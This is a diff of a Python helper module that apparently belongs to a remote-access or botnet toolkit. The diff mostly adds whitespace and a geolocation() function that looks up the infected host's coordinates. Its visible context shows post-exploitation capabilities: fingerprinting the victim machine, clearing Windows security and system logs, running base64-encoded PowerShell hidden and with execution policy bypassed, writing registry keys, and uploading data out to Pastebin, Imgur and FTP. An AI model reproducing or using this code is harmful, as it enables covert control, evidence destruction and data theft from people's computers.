@@ -19,6 +19,7 @@ def log(info, level='debug'):
     logger = logging.getLogger(__name__)
     getattr(logger, level if hasattr(logger, level) else 'debug')(str(info))
 
+
 def imports(source, target=None):
     """
     Attempt to import each package into the module specified
@@ -44,6 +45,7 @@ def imports(source, target=None):
         except ImportError:
             log("missing package '{}' is required".format(source))
 
+
 def is_compatible(platforms=['win32','linux2','darwin'], module=None):
     """
     Verify that a module is compatible with the host platform
@@ -59,6 +61,7 @@ def is_compatible(platforms=['win32','linux2','darwin'], module=None):
     log("module {} is not yet compatible with {} platforms".format(module if module else '', sys.platform), level='warn')
     return False
 
+
 def platform():
     """
     Return the system platform of host machine
@@ -66,6 +69,7 @@ def platform():
     """
     import sys
     return sys.platform
+
 
 def public_ip():
     """
@@ -76,8 +80,9 @@ def public_ip():
     if sys.version_info[0] > 2:
         from urllib.request import urlopen
     else:
-        from urllib2 import urlopen
+        from urllib import urlopen
     return urlopen('http://api.ipify.org').read()
+
 
 def local_ip():
     """
@@ -87,6 +92,7 @@ def local_ip():
     import socket
     return socket.gethostbyname(socket.gethostname())
 
+
 def mac_address():
     """
     Return MAC address of host machine
@@ -94,6 +100,7 @@ def mac_address():
     """
     import uuid
     return ':'.join(hex(uuid.getnode()).strip('0x').strip('L')[i:i+2] for i in range(0,11,2)).upper()
+
 
 def architecture():
     """
@@ -103,6 +110,7 @@ def architecture():
     import struct
     return int(struct.calcsize('P') * 8)
 
+
 def device():
     """
     Return the name of the host machine
@@ -110,6 +118,7 @@ def device():
     """
     import socket
     return socket.getfqdn(socket.gethostname())
+
 
 def username():
     """
@@ -119,6 +128,7 @@ def username():
     import os
     return os.getenv('USER', os.getenv('USERNAME', 'user'))
 
+
 def administrator():
     """
     Return True if current user is administrator, otherwise False
@@ -127,6 +137,23 @@ def administrator():
     import os
     import ctypes
     return bool(ctypes.windll.shell32.IsUserAnAdmin() if os.name == 'nt' else os.getuid() == 0)
+
+
+def geolocation():
+    """
+    Return latitute/longitude of host machine (tuple)
+    """
+    import sys
+    import json
+    if sys.version_info[0] > 2:
+        from urllib.request import urlopen
+    else:
+        from urllib2 import urlopen
+    response = urlopen('http://ipinfo.io').read()
+    json_data = json.loads(response)
+    latitude, longitude = json_data.get('loc').split(',')
+    return (latitude, longitude)
+
 
 def ipv4(address):
     """
@@ -145,6 +172,7 @@ def ipv4(address):
     except:
         return False
 
+
 def status(timestamp):
     """
     Check the status of a job/thread
@@ -161,6 +189,7 @@ def status(timestamp):
           '{} seconds'.format(int(c % 60.0)) if int(c % 60.0) else str()]
     return ', '.join([i for i in data if i])
 
+
 def unzip(filename):
     """
     Extract all files from a ZIP archive
@@ -174,6 +203,7 @@ def unzip(filename):
     z = zipfile.ZipFile(filename)
     path = os.path.dirname(filename)
     z.extractall(path=path)
+
 
 def post(url, headers={}, data={}, json={}, as_json=False):
     """
@@ -217,6 +247,7 @@ def post(url, headers={}, data={}, json={}, as_json=False):
             except: pass
         return output
 
+
 def normalize(source):
     """
     Normalize data/text/stream
@@ -236,6 +267,7 @@ def normalize(source):
         return source.read()
     else:
         return bytes(source)
+
 
 def registry_key(key, subkey, value):
     """
@@ -259,6 +291,7 @@ def registry_key(key, subkey, value):
         log(e)
         return False
 
+
 def png(image):
     """
     Transforms raw image data into a valid PNG data
@@ -269,6 +302,7 @@ def png(image):
     Returns raw image data in PNG format
 
     """
+    import sys
     import zlib
     import numpy
     import struct
@@ -306,12 +340,16 @@ def png(image):
     iend[0] = struct.pack('>I', len(iend[2]))
 
     fileh = StringIO()
-    fileh.write(magic)
-    fileh.write(b"".join(ihdr))
-    fileh.write(b"".join(idat))
-    fileh.write(b"".join(iend))
+    fileh.write(str(magic))
+    fileh.write(str(b"".join(ihdr)))
+    fileh.write(str(b"".join(idat)))
+    fileh.write(str(b"".join(iend)))
     fileh.seek(0)
-    return fileh.getvalue()
+    output = fileh.getvalue()
+    if sys.version_info[0] > 2:
+        output = output.encode('utf-8') # python3 compatibility
+    return output
+
 
 def delete(target):
     """
@@ -334,6 +372,7 @@ def delete(target):
             shutil.rmtree(target, ignore_errors=True)
     except OSError: pass
 
+
 def clear_system_logs():
     """
     Clear Windows system logs (Application, security, Setup, System)
@@ -346,6 +385,7 @@ def clear_system_logs():
                 log(output)
     except Exception as e:
         log(e)
+
 
 def kwargs(data):
     """
@@ -361,6 +401,7 @@ def kwargs(data):
         return {i.partition('=')[0]: i.partition('=')[2] for i in str(data).split() if '=' in i}
     except Exception as e:
         log(e)
+
 
 def powershell(code):
     """
@@ -379,6 +420,7 @@ def powershell(code):
         return os.popen('{} -exec bypass -window hidden -noni -nop -encoded {}'.format(powershell, base64.b64encode(code))).read()
     except Exception as e:
         log("{} error: {}".format(powershell.__name__, str(e)))
+
 
 def display(output, color=None, style=None, end='\\n', event=None, lock=None):
     """
@@ -407,6 +449,7 @@ def display(output, color=None, style=None, end='\\n', event=None, lock=None):
         _style = getattr(colorama.Style, style.upper())
     exec("""print(_color + _style + output + colorama.Style.RESET_ALL, end="{}")""".format(end))
 
+
 def color():
     """
     Returns a random color for use in console display
@@ -417,6 +460,7 @@ def color():
         return random.choice(['BLACK', 'BLUE', 'CYAN', 'GREEN', 'LIGHTBLACK_EX', 'LIGHTBLUE_EX', 'LIGHTCYAN_EX', 'LIGHTGREEN_EX', 'LIGHTMAGENTA_EX', 'LIGHTRED_EX', 'LIGHTWHITE_EX', 'LIGHTYELLOW_EX', 'MAGENTA', 'RED', 'RESET', 'WHITE', 'YELLOW'])
     except Exception as e:
         log("{} error: {}".format(color.__name__, str(e)))
+
 
 def imgur(source, api_key=None):
     """
@@ -429,6 +473,7 @@ def imgur(source, api_key=None):
         return response['data']['link'].encode()
     else:
         log("No Imgur API key found")
+
 
 def pastebin(source, api_key):
     """
@@ -462,6 +507,7 @@ def pastebin(source, api_key):
             log("Upload to Pastebin failed with error: {}".format(e))
     else:
         log("No Pastebin API key found")
+
 
 def ftp(source, host=None, user=None, password=None, filetype=None):
     """
@@ -515,6 +561,7 @@ def ftp(source, host=None, user=None, password=None, filetype=None):
     else:
         log('missing one or more required arguments: host, user, password')
 
+
 def config(*arg, **options):
     """
     Configuration decorator for adding attributes (e.g. declare platforms attribute with list of compatible platforms)
@@ -529,6 +576,7 @@ def config(*arg, **options):
             setattr(wrapper, k, v)
         return wrapper
     return _config
+
 
 def threaded(function):
     """
